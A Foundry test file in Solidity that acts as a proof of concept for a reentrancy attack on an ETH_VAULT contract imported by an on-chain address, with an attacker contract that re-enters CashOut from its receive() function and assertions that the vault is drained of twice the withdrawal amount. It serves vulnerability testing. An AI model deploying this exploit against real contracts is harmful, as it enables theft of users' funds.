// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xbaf51e761510c1a11bf48dd87c0307ac8a8c8a4f.sol";

contract MaliciousContract {
    ETH_VAULT public vault;
    uint public attackCount;
    uint public attackAmount;

    constructor(address payable _vaultAddress, uint _amount) {
        vault = ETH_VAULT(_vaultAddress);
        attackAmount = _amount;
    }

    function deposit() public payable {
        vault.Deposit{value: msg.value}();
    }

    function attack() public {
        vault.CashOut(attackAmount);
    }

    receive() external payable {
        if (attackCount < 1) {
            attackCount++;
            vault.CashOut(attackAmount);
        }
    }
}

contract ETH_VAULTTest is Test {
    ETH_VAULT public vault;
    Log public transferLog;
    MaliciousContract public attacker;
    address public owner = makeAddr("owner");
    address public user = makeAddr("user");
    uint public attackAmount = 1 ether;

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.deal(user, 10 ether);

        vm.prank(owner);
        transferLog = new Log();

        vm.prank(owner);
        vault = new ETH_VAULT(address(transferLog));

        attacker = new MaliciousContract(payable(address(vault)), attackAmount);
        vm.deal(address(attacker), 2 ether);
    }

    function testReentrancyAttack() public {
        uint initialVaultBalance = address(vault).balance;
        uint initialAttackerBalance = address(attacker).balance;

        // Deposit 2 ETH from attacker
        vm.prank(address(attacker));
        attacker.deposit{value: 2 ether}();

        console.log("--- BEFORE-Trigger Attack ---");
        uint vaultBalanceBefore = address(vault).balance;
        uint attackerBalanceBefore = address(attacker).balance;
        uint attackerVaultBalanceBefore = vault.balances(address(attacker));
        console.log("Vault ETH Balance: %d wei", vaultBalanceBefore);
        console.log("Attacker ETH Balance: %d wei", attackerBalanceBefore);
        console.log("Attacker Internal Balance in vault: %d wei", attackerVaultBalanceBefore);

        console.log("--- Trigger Attack ---");
        // Execute attack
        vm.prank(address(attacker));
        attacker.attack();

        console.log("--- AFTER-Trigger Attack ---");
        uint vaultBalanceAfter = address(vault).balance;
        uint attackerBalanceAfter = address(attacker).balance;
        uint attackerVaultBalanceAfter = vault.balances(address(attacker));
        console.log("Vault ETH Balance: %d wei", vaultBalanceAfter);
        console.log("Attacker ETH Balance: %d wei", attackerBalanceAfter);
        console.log("Attacker Internal Balance in vault: %d wei", attackerVaultBalanceAfter);

        // Differential verification
        if (vaultBalanceAfter == 0 && 
            attackerBalanceAfter == 2 ether && 
            attackerVaultBalanceAfter == 0) {
            console.log("Vulnerability Exists: Reentrancy attack succeeded as internal state was updated after multiple withdrawals");
        } else {
            console.log("Vulnerability not Exist: Reentrancy attack failed or was mitigated");
        }

        // Verify balances after attack
        // Attacker should have withdrawn twice (original balance + 2 withdrawals)
        assertEq(
            address(attacker).balance,
            initialAttackerBalance - 2 ether + attackAmount * 2,
            "Attacker balance incorrect"
        );
        
        // Vault should have lost twice the attack amount
        assertEq(
            address(vault).balance,
            initialVaultBalance + 2 ether - attackAmount * 2,
            "Vault balance incorrect"
        );
    }
}